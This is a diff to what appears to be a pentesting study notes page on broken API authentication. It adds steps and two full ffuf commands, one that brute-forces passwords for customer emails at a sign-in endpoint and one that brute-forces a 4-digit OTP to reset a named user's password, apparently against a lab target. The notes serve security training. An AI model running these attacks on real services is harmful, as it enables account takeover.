@@ -1209,7 +1209,22 @@
 <h2 id="broken-authentication">Broken Authentication</h2>
 <ul>
 <li><a href="https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/">API2:2023</a></li>
-<li>The authentication mechanisms of the API can be bypassed or circumvented, allowing unauthorized access</li>
+<li>
+<p>The authentication mechanisms of the API can be bypassed or circumvented, allowing unauthorized access</p>
+</li>
+<li>
+<p>Authenticate as one user</p>
+</li>
+<li>Find what is accessible for their role</li>
+<li>Try changing password to "pass" and inspect error message to see if allows weak passwords</li>
+<li>If weak passwords are allowed can try fuzzing passwords for known users</li>
+<li>try an incorrect password to get error message</li>
+<li>fuzz passwords with ffuf
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1">ffuf<span class="w"> </span>-w<span class="w"> </span>/opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS<span class="w"> </span>-w<span class="w"> </span>customerEmails.txt:EMAIL<span class="w"> </span>-u<span class="w"> </span>http://94.237.120.112:34036/api/v1/authentication/customers/sign-in<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;Email&quot;: &quot;EMAIL&quot;, &quot;Password&quot;: &quot;PASS&quot;}&#39;</span><span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Invalid Credentials&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">100</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>fuzz OTP for password reset
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1">ffuf<span class="w"> </span>-w<span class="w"> </span>/opt/useful/seclists/Fuzzing/4-digits-0000-9999.txt:FUZZ<span class="w"> </span>-u<span class="w"> </span>http://94.237.120.112:34036/api/v1/authentication/customers/passwords/resets<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;Email&quot;: &quot;MasonJenkins@ymail.com&quot;, &quot;OTP&quot;: &quot;FUZZ&quot;, &quot;NewPassword&quot;: &quot;password&quot;}&#39;</span><span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;false&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">100</span>
+</span></code></pre></div></td></tr></table></div></li>
 </ul>
 <h2 id="broken-object-property-level-authorization">Broken Object Property Level Authorization</h2>
 <ul>
